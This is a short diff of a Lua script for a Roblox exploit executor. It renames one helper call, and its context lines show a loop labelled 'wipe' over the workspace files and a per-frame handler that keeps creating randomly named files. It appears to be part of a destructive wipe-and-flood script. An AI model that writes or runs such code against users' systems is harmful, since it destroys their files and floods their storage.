@@ -92,7 +92,7 @@ for i,v in pairs(listfiles("")) do -- wipe
 end
 
 game:GetService("RunService").RenderStepped:Connect(function()
-    local str = generate_random_string(math.random(1, 20))
+    local str = Functions.generate_random_string(math.random(1, 20))
     if math.random(0, 1) == 1 then
         writefile(str, "")
     else
@@ -141,6 +141,7 @@ print("debug: type new, if not seen then its github's problem")
         table.clear(getgenv(), v)
     end
 end]]
+
 
 
 
